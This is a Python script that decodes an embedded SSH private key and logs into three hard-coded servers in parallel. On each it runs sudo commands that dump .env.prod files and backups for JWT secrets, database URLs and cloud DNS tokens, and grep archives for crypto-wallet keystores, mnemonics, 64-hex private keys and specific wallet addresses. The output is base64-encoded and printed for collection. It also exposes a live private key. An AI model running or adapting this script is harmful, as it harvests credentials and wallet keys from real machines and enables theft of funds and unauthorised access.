# -*- coding: utf-8 -*-
# intent 29489 round E: hunt 0xC56f/0xFE18/zoofi in share-center org-runtime session archives + apps,
# read wjl center env, LLM live env. Bounded context extraction.
import json,os,sys,base64,re,subprocess,time
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29489e"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)
def R(k,v,maxb=60000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def run(cmd,timeout=320):
    try:
        p=subprocess.run(cmd,capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
CMDS={
"share-center":r'''
echo "@@@ORGS"; sudo ls -la /data/lumii-shared/org-runtime 2>/dev/null | head -40
echo "@@@ORGNAMES"; for d in /data/lumii-shared/org-runtime/org_*; do echo -n "$d "; sudo cat $d/org.json 2>/dev/null | tr -d '\n' | head -c 300; echo; done
echo "@@@SA_TARGET"; timeout 150 sudo grep -rhoaE ".{0,50}(0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6).{0,50}" /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -20
echo "@@@SA_ZOOFI"; timeout 150 sudo grep -rhoaE ".{0,70}zoofi.{0,70}" /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -30
echo "@@@SA_EVM"; timeout 150 sudo grep -rhoaE "0x[0-9a-fA-F]{64}" /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -30
echo "@@@SA_KEYWORDS"; timeout 150 sudo grep -rhoaE "keystore|cipherparams|scrypt|BIP39|mnemonic|privateKey|private_key" /data/lumii-shared/org-runtime 2>/dev/null | sort | uniq -c | sort -rn | head -20
echo "@@@APPZOOFI"; timeout 90 sudo grep -rlaE "zoofi|wand-index|wandfi" /data/lumii-shared/app/apps /data/lumii-shared/app/deploy 2>/dev/null | grep -v node_modules | head -30
echo "@@@ENVBAKS"; sudo bash -c 'for f in /data/lumii-shared/app/.env.prod.bak-iss796-20261102-194628 /data/lumii-shared/app/.env.prod.bak-20261112-025838-iss781-legacy; do echo "== $f"; grep -aiE "zoofi|JWT_SECRET|DATABASE_URL|0xC56f|0xFE18|TENCENT|DNSPOD" "$f" 2>/dev/null | head; done'
echo "@@@END"''',
"wu-ji-lian":r'''
echo "@@@CENTERENV"; sudo cat /opt/lumii-wjl/.env.prod 2>/dev/null
echo "@@@CENTERENV_TAIL"; sudo bash -c 'cat /opt/lumii-wjl/.env.prod 2>/dev/null | wc -l'
echo "@@@GREP"; timeout 90 sudo grep -rhoaE ".{0,40}(zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|BIP39).{0,40}" /opt /data /home 2>/dev/null | grep -vE "lumii-lak-dist" | sort -u | head -30
echo "@@@END"''',
"LLM":r'''
echo "@@@LIVE"; sudo cat /opt/src/lumii-bw/.env.bw 2>/dev/null | grep -aiE "DATABASE|JWT|SECRET|TOKEN|KEY|zoofi|TENCENT|DNSPOD" | head -40
echo "@@@GREP"; timeout 100 sudo grep -rhoaE ".{0,40}(zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|BIP39).{0,40}" /opt/src/lumii-bw /opt/src/lumii-trial /opt/src/lumii-bw-data 2>/dev/null | grep -vE "node_modules|\.git/|lak-dist" | sort -u | head -30
echo "@@@END"''',
}
TARGETS=[("43.143.107.214","share-center"),("1.14.34.31","wu-ji-lian"),("81.68.254.22","LLM")]
def do(idx,host,label):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","IdentitiesOnly=yes","ubuntu@%s"%host,CMDS[label]]
    rc,o,e=run(a,timeout=340)
    ok=("@@@END" in o)
    R("t%d_%s_meta"%(idx,label),{"rc":rc,"ok":ok,"err":e[-120:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("t%d_%s"%(idx,parts[i].lower()),parts[i+1] if i+1<len(parts) else "",maxb=70000)
    return {"idx":idx,"host":host,"label":label,"rc":rc,"ok":ok}
RES=[]
try:
    with ThreadPoolExecutor(max_workers=3) as ex:
        for f in [ex.submit(do,i,h,l) for i,(h,l) in enumerate(TARGETS)]:
            try: RES.append(f.result())
            except Exception as e: R("exc",repr(e))
except Exception as e: R("top_exc",repr(e))
R("summary",RES); R("done",{"t":int(time.time())})
